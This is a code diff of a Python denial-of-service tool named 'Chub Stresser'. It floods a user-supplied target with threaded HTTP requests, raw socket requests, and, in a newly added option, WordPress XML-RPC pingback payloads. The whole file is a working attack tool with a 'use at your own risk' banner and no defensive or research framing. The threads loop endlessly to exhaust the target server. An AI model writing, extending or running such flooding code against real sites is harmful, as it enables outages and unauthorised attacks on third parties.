@@ -15,42 +15,92 @@ import socket
 import os
 from colorama import Fore, Style
 
+
 def chub_ascii():
-    print(Fore.GREEN + """
-             /\_/\\  """ + Fore.RED + "Chub" + Fore.RED + " Stresser !" + Fore.GREEN + """
-            ( o.o ) """ + Fore.BLUE + "Use at your own risk :v" + Fore.GREEN + """
-             > ^ < """ + Fore.BLUE + " Author - " + Fore.GREEN + "Muchub" + Fore.GREEN + """
-        """ + Style.RESET_ALL)
-    
+    print(
+        Fore.GREEN
+        + """
+             /\_/\\  """
+        + Fore.RED
+        + "Chub"
+        + Fore.RED
+        + " Stresser !"
+        + Fore.GREEN
+        + """
+            ( o.o ) """
+        + Fore.BLUE
+        + "Use at your own risk :v"
+        + Fore.GREEN
+        + """
+             > ^ < """
+        + Fore.BLUE
+        + " Author - "
+        + Fore.GREEN
+        + "Muchub"
+        + Fore.GREEN
+        + """
+        """
+        + Style.RESET_ALL
+    )
+
+
 def print_up(thread_id):
-    print(Fore.GREEN + f"\rThread {thread_id}: Request Sent, Server up      " + Style.RESET_ALL, end="")
+    print(
+        Fore.GREEN
+        + f"\rThread {thread_id}: Request Sent, Server up      "
+        + Style.RESET_ALL,
+        end="",
+    )
+
 
 def print_down(thread_id):
-    print(Fore.RED + f"\rThread {thread_id}: Cannot reach server !!!        " + Style.RESET_ALL, end="")
- 
+    print(
+        Fore.RED
+        + f"\rThread {thread_id}: Cannot reach server !!!        "
+        + Style.RESET_ALL,
+        end="",
+    )
+
+
 def chub_user_agent():
     user_agent = fake_useragent.UserAgent()
     return user_agent.random
-        
+
+
 def chub_request(host, headers, thread_id, target_port):
     global user_option, num_timeout
-    
-    if user_option == 0: # Using normal get request
+
+    if user_option == 0:  # Using normal get request
         try:
             requests.get(host, headers=headers, timeout=num_timeout)
             print_up(thread_id)
         except requests.RequestException as e:
             print_down(thread_id)
-    if user_option == 1: # using socket
+    if user_option == 1:  # using socket
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.connect((host, target_port))
-            client_socket.sendall(f'GET / HTTP/1.1\r\nHost: {host}\r\n'.encode())
+            client_socket.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
             print_up(thread_id)
             time.sleep(num_timeout)
         except Exception as e:
             print_down(thread_id)
-    
+    if user_option == 2:  # XMLRPC DoS
+        try:
+            payload = f"""<?xml version="1.0"?>
+                            <methodCall>
+                            <methodName>pingback.ping</methodName>
+                            <params>
+                                <param><value><string>{host}</string></value></param>
+                                <param><value><string>https://target-site.com/</string></value></param>
+                            </params>
+                            </methodCall>"""
+            requests.post(host, data=payload, headers={"Content-Type": "text/xml"}, timeout=num_timeout)
+            print_up(thread_id)
+        except Exception as e:
+            print_down(thread_id)
+
+
 def chub_thread(thread_id, target_host, target_port):
     random_user_agent = chub_user_agent()
     custom_headers = {
@@ -59,35 +109,46 @@ def chub_thread(thread_id, target_host, target_port):
     while True:
         chub_request(target_host, custom_headers, thread_id, target_port)
 
+
 if __name__ == "__main__":
     try:
-        os.system('cls')  
+        os.system("cls")
         chub_ascii()
-        print("0. Using direct URL (http://example.com)")
-        print("1. Using DNS or IP (example.com or 127.0.0.1)")
+        options = ["Using direct URL (http://example.com)", "Using DNS or IP (example.com or 127.0.0.1)", "Wordpress XMLRPC DoS"]
+        for i in range(len(options)):
+            print(f"{i}. {options[i]}")
         user_option = -1
-        while user_option > 1 or user_option < 0:
+        while user_option > len(options) or user_option < 0:
             user_option = int(input("\nEnter option: "))
-            
-        os.system('cls')   
+
+        os.system("cls")
         chub_ascii()
-        
-        target_port = 0 # just initialize
-        
-        if user_option == 0:   
+
+        target_port = 0  # just initialize
+
+        if user_option == 0:
             target_host = input("Enter target URL (http://example.com): ")
-            
-        if user_option == 1:  
+
+        if user_option == 1:
             target_host = input("Enter target host: ")
             target_port = int(input("Enter target port: "))
-            
-        num_timeout = int(input("Enter the number of " + Fore.BLUE + "timeout: " + Style.RESET_ALL))
-        num_threads = int(input("Enter the number of " + Fore.RED + "threads: " + Style.RESET_ALL))
-        
+
+        if user_option == 2:
+            target_host = input("Enter XMLRPC URL (http://example.com/xmlrpc.php): ")
+
+        num_timeout = int(
+            input("Enter the number of " + Fore.BLUE + "timeout: " + Style.RESET_ALL)
+        )
+        num_threads = int(
+            input("Enter the number of " + Fore.RED + "threads: " + Style.RESET_ALL)
+        )
+
         # Create threads
         threads = []
         for i in range(num_threads):
-            thread = threading.Thread(target=chub_thread, args=(i, target_host, target_port))
+            thread = threading.Thread(
+                target=chub_thread, args=(i, target_host, target_port)
+            )
             threads.append(thread)
 
         # Start the threads
